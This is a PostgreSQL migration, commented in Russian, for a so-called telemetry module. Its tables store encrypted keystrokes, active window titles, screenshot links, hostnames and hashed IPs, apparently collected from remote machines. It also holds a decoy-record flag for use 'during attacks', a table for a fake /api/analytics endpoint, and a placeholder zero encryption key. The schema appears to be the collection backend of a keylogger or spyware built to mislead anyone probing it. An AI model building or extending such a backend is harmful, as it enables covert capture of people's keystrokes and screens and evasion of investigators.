-- Миграция для модуля телеметрии (Render PostgreSQL)
-- КРИТИЧНО: Все чувствительные данные только в зашифрованном виде!

-- Включаем расширение для UUID
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pgcrypto";

-- Таблица для ротации ключей шифрования
CREATE TABLE IF NOT EXISTS encryption_keys (
  id SERIAL PRIMARY KEY,
  key_data BYTEA NOT NULL, -- Зашифрованный ключ шифрования
  key_hash VARCHAR(64) NOT NULL, -- SHA256 хэш для идентификации
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  is_active BOOLEAN DEFAULT true,
  version VARCHAR(10) DEFAULT 'aes-256-gcm'
);

CREATE INDEX IF NOT EXISTS idx_encryption_keys_active ON encryption_keys(is_active);

-- Основная таблица телеметрии
CREATE TABLE IF NOT EXISTS telemetry_logs (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  timestamp TIMESTAMPTZ NOT NULL,
  hostname VARCHAR(255) NOT NULL,
  hostname_hash VARCHAR(64), -- SHA256 хэш для индексации
  
  -- ВСЕ ЧУВСТВИТЕЛЬНЫЕ ДАННЫЕ ТОЛЬКО В ЗАШИФРОВАННОМ ВИДЕ
  keystrokes_encrypted TEXT, -- BYTEA в base64
  keystrokes_hash VARCHAR(64), -- SHA256 для проверки целостности
  active_window_encrypted TEXT, -- BYTEA в base64
  active_window_hash VARCHAR(64),
  
  screenshot_url TEXT, -- Signed URL с TTL
  screenshot_signed_url_expires_at TIMESTAMPTZ,
  system_info JSONB, -- Валидированный через SystemInfoDto (белый список полей)
  
  user_agent TEXT,
  ip_hash VARCHAR(64), -- SHA256(IP + IP_SALT) - НИКОГДА НЕ ХРАНИТЬ IP ОТКРЫТО!
  
  is_decoy BOOLEAN DEFAULT false, -- Флаг для фейковых записей при атаках
  
  encryption_key_id INTEGER REFERENCES encryption_keys(id),
  encryption_version VARCHAR(10) DEFAULT 'aes-256-gcm',
  
  received_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_telemetry_hostname_hash ON telemetry_logs(hostname_hash);
CREATE INDEX IF NOT EXISTS idx_telemetry_received_at ON telemetry_logs(received_at);
CREATE INDEX IF NOT EXISTS idx_telemetry_timestamp ON telemetry_logs(timestamp);
CREATE INDEX IF NOT EXISTS idx_telemetry_ip_hash ON telemetry_logs(ip_hash);

-- Таблица для фейкового эндпоинта /api/analytics
CREATE TABLE IF NOT EXISTS fake_analytics_logs (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  data JSONB,
  received_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Вставка начального ключа шифрования (заглушка)
-- ВАЖНО: В продакшене нужно создать реальный ключ!
INSERT INTO encryption_keys (key_data, key_hash, is_active, version)
VALUES (
  '\x00000000000000000000000000000000'::bytea, -- Заглушка, заменить на реальный ключ!
  '0000000000000000000000000000000000000000000000000000000000000000', -- SHA256 хэш заглушки
  true,
  'aes-256-gcm'
)
ON CONFLICT DO NOTHING;
